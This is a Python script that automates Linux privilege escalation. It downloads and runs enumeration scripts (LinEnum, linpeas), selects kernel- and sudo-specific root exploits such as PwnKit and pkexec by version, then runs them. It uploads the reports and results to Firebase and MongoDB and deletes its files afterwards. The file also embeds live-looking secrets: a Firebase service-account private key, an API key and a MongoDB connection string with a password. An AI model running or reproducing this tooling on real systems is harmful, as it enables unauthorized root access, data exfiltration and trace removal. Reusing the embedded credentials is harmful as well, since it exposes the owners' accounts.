import os
import subprocess
import stat
import json
import re
import pymongo
import requests
from pathlib import Path
import pyrebase


config = {
    "apiKey": "AIzaSyBGsQbR5e2pN46SMAwi-WR9R38hi04HjKg",
    "authDomain": "cloudoffsec.firebaseapp.com",
    "projectId": "cloudoffsec",
    "storageBucket": "cloudoffsec.appspot.com",
    "messagingSenderId": "685241334274",
    "appId": "1:685241334274:web:df0c09be96c1bc683d051b",
    "measurementId": "G-RLR28BLJ62",
    "type": "service_account",
    "project_id": "cloudoffsec",
    "private_key_id": "b0218cb2b3f2f7198d1c07cb7a0b1838d07bd17f",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCu/Ed5yRITGkWi\nZdZPcvfb0sl10aaopIzsscX1ZU8hNx1KHoRYfduRUdEMKpAdHe3c4C9BeORgRY6w\nMWTlPaFejzRzSTp+19b5Ou/yE8BOzoWhnoHKjsL06f2OE7GODU24LEoblVOSrqlv\nFmNRPosoTjUI3gcpTXr9NBJukuiik+vQIrOQrtuCx8J0TlUsLD6Vwrn5a37Qn3pQ\nceqpycuderYG+WySNhVxmyTXTrTnpPTJgedtQo93XfZA/oKEzJu2At7sig7RYPQH\nBf2eIz4tf+xPQh1QzwLpiJHlb4zcCFCJKF90rcb1ifhpgitU0Qx2aNtwLdHO2vMF\nOEVjZjqPAgMBAAECggEANgz4OQ6aVis50jF5st3U4OJp10pUm+gEHcLF3oiWGjDv\ni6sEf18U+PzYQVVOYagShrT689LXXENwEU2YmFTiqRY8AdZfSrn6Dc8eOdzO/Ki/\nT05qUfqqDsPOTdoYcMP8O0T2+TE1eOwZqxYzxG84xdDugdgvRxtHP7obbWtUj471\nmFfpjAnKHwPypBvCQPn5siC6aat5dgyy4uz7i2x4s37vjjGfaWfSp+XBVnUAcTLx\nW7qh+IWBX3yW6XC8s4Ts8PdZhNTDl6dDrFIUJhdqCcwW57CRRDybQAEn8BFh/sGJ\nOGS4bBm0WckRV3NGoGS+xZr84tbZyBCpOUZ9v+OLPQKBgQDdS7ZeyVYm/rHMdLdm\n9/6PErir+MfcenDht71S/jZgQVy8cdqk3mFgrJBnfe2e9APHLCi29iejz7+86kf3\nk6HYRmApaaW0s+CzR44ZL8Xo4K+kNCUvAuc+pvQJEjzBr13O2jD4rji867Re6QU9\npIz/3MINleHp9QwMFlseeGpAowKBgQDKbVzvngvvdIycQU5TNGjV0lzMFHt0vbaM\nTy7ca+v9mVdUk02jfXznaG+oiZNHdVdoJQcezzd6AuKNQebxkvPV+5xhP5yMfeQQ\nXpPaY1SCzdvC/x1zLb3js/p3881aSbNw+P2gKkop1+PP6UcjOS+hTosie2+D74DS\nYlHHnnDBJQKBgQCz55xwfJ/kfcTP4cdEF7LEX8TwUgUxUf05E2X/9ZkBMcIRlUHa\nLMvfiwquiCrIwbncjyLec0mQnBFVpOUy+btmlvgQUsobGO1A8pgsE7GCfD9ub9IW\n4PZb8eCNC12HXGkYBDwxv3ly5PAzBJ91GLRkQfUklEggKk5L+VTEdcJznwKBgGhh\nkGS2+KyXStJgEoVxJwXrHZLWlPqTwQgE5MMgm2X/pjqkYoqFcNzay4j6uAlHBrVb\nMpq+e3rc9fmlG/NBtZ6HyhGTfaQsXmfafR9FzRROFp4scwErexlpeyRTgXanPnJo\n0k++vtNo0b4qKlaNbHQfTjuPruc3nxPdQxJOLxJJAoGAESlAqdwxWVZZ8jPgi2xK\nJ3xrwiYLp9t04nluzms3Wr0cx53jjrS9z8y8Y+IXnU9I3RnMKJzPfkND9dn5fI3O\nv472Fb1I5dNESXacWMNt/h+9WhB+ztSeiyvaU3fzvoWrD8ef+m8wd/dq4SpqorIa\nSCVSY2NZ+zQzKOcXoVj7LnE=\n-----END PRIVATE KEY-----\n",
    "client_email": "firebase-adminsdk-o9cpw@cloudoffsec.iam.gserviceaccount.com",
    "client_id": "100706753477186624513",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-o9cpw%40cloudoffsec.iam.gserviceaccount.com",
    "databaseURL": "https://cloudoffsec-default-rtdb.firebaseio.com/"
    }
firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

# filename = Path('PwnKit')

# response = requests.get('http://localhost:3000/file/download/PwnKit',allow_redirects=True)
# print(response)

# filename.write_bytes(response.content)


global kernel_name
p = subprocess.Popen(['whoami'], stdout=subprocess.PIPE).communicate()[0]
kernel_name = p.decode('utf-8')
kernel_name = kernel_name.rstrip()

global sudo 
p = subprocess.Popen(['''sudo -V 2>/dev/null| grep "Sudo version" 2>/dev/null'''], stdout=subprocess.PIPE, shell=True).communicate()[0]
sudo = p.decode('utf-8')

if kernel_name != "root":
    def LinEnum():
        filename = Path('LinEnum.sh')
        response = requests.get('http://localhost:3000/file/download/LinEnum',allow_redirects=True)
        filename.write_bytes(response.content)
        st = os.stat('LinEnum.sh')
        os.chmod('LinEnum.sh', st.st_mode | stat.S_IEXEC)
        args = ['''./LinEnum.sh | aha --style 'background-color: white' | wkhtmltopdf - LinEnum.pdf''']
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
        child_proccess.wait()
        print("printed as pdf")
        args = ["./LinEnum.sh > linenum.txt"]
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
        child_proccess.wait()
        path_on_cloud = "files/LinEnum.pdf"
        path_local = "LinEnum.pdf"
        storage.child(path_on_cloud).put(path_local)
        print("printed as txt")
        
    def Linpeas():
        filename = Path('linpeas.sh')
        response = requests.get('http://localhost:3000/file/download/linpeas',allow_redirects=True)
        filename.write_bytes(response.content)
        st = os.stat('linpeas.sh')
        os.chmod('linpeas.sh', st.st_mode | stat.S_IEXEC)
        args = ['''./linpeas.sh | aha --style 'background-color: white' | wkhtmltopdf - linpeas.pdf''']
        child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, shell=True)
        child_proccess.wait()
        path_on_cloud = "files/linpeas.pdf"
        path_local = "linpeas.pdf"
        storage.child(path_on_cloud).put(path_local)
        print("printed as pdf")

    p = subprocess.Popen(['uname', '-r'], stdout=subprocess.PIPE).communicate()[0]
    kernel_name = p.decode('utf-8')
    kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+", kernel_name))
    
    
    def checkExploit():
        global dict
        with open('linenum.txt') as file:
            content = file.readlines()
            if kernel_name in content:
                kernel_name1 = kernel_name.join(re.findall(r"[0-9]+\.[0-9]+\.[0-9]+", kernel_name))
                if kernel_name1 == "5.5.0" or kernel_name1 == "5.7.0" or kernel_name1 == "5.9.0":
                    filename = Path("PwnKit")
                    response = requests.get('http://localhost:3000/file/download/PwnKit',allow_redirects=True)
                    filename.write_bytes(response.content)
                    st = os.stat('PwnKit')
                    os.chmod('PwnKit', st.st_mode | stat.S_IEXEC)
                    args = ["./PwnKit"]
                    child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                    child_process_output = child_proccess.communicate(b"whoami > output.txt | id > id.txt")[0]
                    dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value',}
        
                elif kernel_name1 == "5.4.0":
                    filename = Path("exploit")
                    response = requests.get('http://localhost:3000/file/download/exploit',allow_redirects=True)
                    filename.write_bytes(response.content)
                    st = os.stat('exploit')
                    os.chmod('exploit', st.st_mode | stat.S_IEXEC)
                    args = ["./exploit"]
                    child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                    child_process_output = child_proccess.communicate(b"whoami > output.txt | id > id.txt")[0]
                    dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Exploits pkexec using GCONV Environmnent Variable then assign the shell value',}
        
                elif kernel_name1 == "4.19.0" or kernel_name1 == "4.15.11" or kernel_name1 == "4.13.0" or kernel_name1 == "4.18.0":
                    filename = Path("pwn")
                    response = requests.get('http://localhost:3000/file/download/pwn',allow_redirects=True)
                    filename.write_bytes(response.content)
                    st = os.stat('pwn')
                    os.chmod('pwn', st.st_mode | stat.S_IEXEC)
                    args = ["./pwn"]
                    child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                    child_process_output = child_proccess.communicate(b"whoami > output.txt | id > id.txt")[0]
                    dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}

                elif kernel_name1 == "5.14.0" or kernel_name1 == "5.10.0":
                    filename = Path("pkexec")
                    response = requests.get('http://localhost:3000/file/download/pkexec',allow_redirects=True)
                    filename.write_bytes(response.content)
                    st = os.stat('pkexec')
                    os.chmod('pkexec', st.st_mode | stat.S_IEXEC)
                    args = ["./pkexec"]
                    child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                    child_process_output = child_proccess.communicate(b"whoami > output.txt | id > id.txt")[0]
                    dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
            
                else:
                    user = subprocess.Popen(['whoami'], stdout=subprocess.PIPE).communicate()[0]
                    user = user.decode('utf-8')
                    with open('output.txt','w') as data:
                        data.write(str(user))
                    dict = {'Pre Attack':'No Exploit Found','Status':'No Exploit to execute','Description':'This Linux has no Exploit so for',}

    def sudoCheck():
        with open("linenum.txt") as file:
            content = file.readlines()
            if sudo in content:
                if sudo == '1.8.31':
                    st = os.stat('exploit')
                    os.chmod('exploit', st.st_mode | stat.S_IEXEC)
                    args = ["./exploit"]
                    child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                    child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]   
                else:
                    print("No exploit for this sudo") 
                

        with open("output.txt") as file:
            text = file.read()
            text = text.rstrip()
            if text != "root":
                print("You did not got the root")
            else:
                print("You got the root")
            
            # For reading Lines
            # for i, line in enumerate(file):
            #     print(line[5:10])
            
    def file_to_Json(dict):
        success = False
        root = "root"
        file = open('output.txt','r')
        text = file.read()
        text = text.rstrip()
        file = open('id.txt','r')
        id = file.read()
        id = id.rstrip()
        if root == text:
            success = True
            dicti = {'User': text,'linuxKernel': kernel_name1,"success": success,"Evidence":id}
            dict.update(dicti)
            
        else:
            success = False
            dicti = {'User': text,'linuxKernel': kernel_name1,'success':success,"Evidence":id}
            dict.update(dicti)
            
        with open('trace.json', 'w') as file:
            json.dump(dict,file,ensure_ascii=False,indent=2)
            
    def Uploaddb():
        client = pymongo.MongoClient("mongodb+srv://HassanTuri:hassanturi@devconnector.g6cxh.mongodb.net/myFirstDatabase?retryWrites=true&w=majority")
        db = client['Linux_Trace_db']
        linux_trace = db['linux_trace']
        
        with open('trace.json') as f:
            data = json.load(f)
        
        
        kernel = linux_trace.find_one({'linuxKernel':kernel_name1},{'_id':0,"Pre Attack":0,"Status":0,'Description':0,"sucess":0})
        
        # chk_kernel = kernel["linux kernel"]
        
        if kernel == None or kernel["linuxKernel"] != kernel_name1:
            linux_trace.insert_one(data)
            print("Data Uploaded Succesfully")
        else:
            print("Data already Uploaded")
        
        client.close()
            
    def deletefiles():
        os.remove("id.txt")
        # os.remove('trace.json')
        os.remove("linenum.txt")
        os.remove('output.txt')
        os.remove("PwnKit")
        os.remove("linpeas.sh")
        os.remove("LinEnum.sh")
   
    LinEnum()
    Linpeas()
    checkExploit()
    sudoCheck()  
    file_to_Json(dict)
    Uploaddb()
    deletefiles()
else:
    print("you are already root")
